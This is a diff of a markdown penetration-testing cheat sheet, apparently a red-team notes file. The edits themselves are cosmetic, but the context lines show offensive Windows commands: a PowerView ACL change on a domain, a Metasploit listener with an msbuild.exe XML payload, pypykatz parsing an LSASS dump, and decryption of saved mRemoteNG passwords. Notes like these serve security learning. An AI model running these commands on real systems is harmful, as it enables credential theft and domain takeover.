@@ -80,6 +80,7 @@ Add-ObjectAcl -Credential $Cred -TargetIdentity "dc=domain,dc=local" -PrincipalI
 ### References
 - [Powerview and PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
+
 # Directories to check
 ```bash
 # Powershell history log file
@@ -120,7 +121,7 @@ set lhost <ip>
 sel lport <port>
 generate
 ```
-Now start the lister with `msfconsole -r file.rc`` and execute the xml payload with:
+Now start the lister with `msfconsole -r file.rc` and execute the xml payload with:
 ```powershell
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
@@ -222,7 +223,7 @@ pypykatz lsa minidump <lsass_dump_file>
 - [https://attack.mitre.org/techniques/T1003/001/](https://attack.mitre.org/techniques/T1003/001/)
 
 ## mRemoteNG
-mRemoteNG is a remote connection management tool, and it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:
+mRemoteNG is a remote connection management tool, it allows the user to save passwords for various types of connections. There is a file in the user's AppData directory, confCons.xml, that holds that information:
 
 ### confCons.xml
 One can use `mremoteng-decrypt` to crack the password from the config file.     
@@ -233,9 +234,7 @@ python3 mremoteng_decrypt.py -s <string>
 [https://github.com/kmahyyg/mremoteng-decrypt](https://github.com/kmahyyg/mremoteng-decrypt)
 
 # Analyse office files
-Modern *Office* documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
-
-## Unzip
+Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.
 ```bash
 unzip <file>
 ```
